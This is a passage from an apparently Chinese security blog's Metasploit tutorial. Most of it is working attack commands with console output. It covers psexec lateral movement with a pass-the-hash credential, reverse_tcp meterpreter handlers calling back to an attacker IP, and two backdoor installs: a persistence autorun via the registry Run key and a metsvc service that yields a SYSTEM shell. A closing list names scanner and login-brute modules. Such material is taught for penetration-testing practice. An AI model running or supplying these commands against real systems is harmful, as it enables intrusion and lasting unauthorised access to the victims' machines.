<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.159.134</span><br><span class="line">msf &gt; set LPORT 443</span><br><span class="line">msf &gt; set RHOST 192.168.159.144</span><br><span class="line">msf &gt;set SMBUser Administrator</span><br><span class="line">msf &gt;set SMBPass aad3b4*****04ee:5b5f00*****c424c</span><br><span class="line">msf &gt;set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain</span><br><span class="line">msf &gt;exploit</span><br></pre></td></tr></table></figure>
<h2><span id="hou-men-zhi-ru">后门植入</span><a href="#hou-men-zhi-ru" class="header-anchor">#</a></h2><p><code>metasploit</code>自带的后门有两种方式启动的，一种是通过启动项启动(<code>persistence</code>)，一种是通过服务启动(<code>metsvc</code>)，另外还可以通过<code>persistence_exe</code>自定义后门文件。</p>
<h3><span id="persistence-qi-dong-xiang-hou-men">persistence启动项后门</span><a href="#persistence-qi-dong-xiang-hou-men" class="header-anchor">#</a></h3><p>在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本<br>在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 6661 -r 192.168.159.134</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 5 -p 6661 -r 192.168.22.170</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-7_20181219.5619/WIN-7_20181219.5619.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.22.170 LPORT=6661</span><br><span class="line">[*] Persistent agent script is 99632 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\uIMYmofzh.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\uIMYmofzh.vbs</span><br><span class="line">[+] Agent executed with PID 336</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QXbddoBLcqYjXg</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QXbddoBLcqYjXg</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.22.170</span><br><span class="line">lhost =&gt; 192.168.22.170</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 6661</span><br><span class="line">lport =&gt; 6661</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:6661 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.22.170:6661 -&gt; 192.168.22.171:49327) at 2018-12-19 01:57:52 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<h3><span id="metsvc-fu-wu-hou-men">metsvc服务后门</span><a href="#metsvc-fu-wu-hou-men" class="header-anchor">#</a></h3><p>在<code>C:\Users***\AppData\Local\Temp\</code>上传了三个文件（<code>metsrv.x86.dll</code>、<code>metsvc-server.exe</code>、<code>metsvc.exe</code>），通过服务启动，服务名为meterpreter</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –h   # 查看帮助</span><br><span class="line">run metsvc –A   #自动安装后门</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~1\AppData\Local\Temp\QVRUVXrjfrcMn...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">	 * Installing service metsvc</span><br><span class="line">Cannot create service (0x00000431)</span><br><span class="line"></span><br><span class="line">[*] Trying to connect to the Meterpreter service at 192.168.22.171:31337...</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<h2><span id="sao-miao-jiao-ben">扫描脚本</span><a href="#sao-miao-jiao-ben" class="header-anchor">#</a></h2><p>扫描的脚本位于：<br><code>/usr/share/metasploit-framework/modules/auxiliary/scanner/</code><br>扫描的脚本较多，仅列几个代表：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_scanner</span><br><span class="line">use auxiliary/scanner/http/jboss_vulnscan</span><br><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br><span class="line">use auxiliary/scanner/mysql/mysql_version</span><br><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br></pre></td></tr></table></figure>
</div></article></div></section><footer><div class="paginator"><a href="/posts/代码审计/代码审计3-熊海cms-v1-0.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>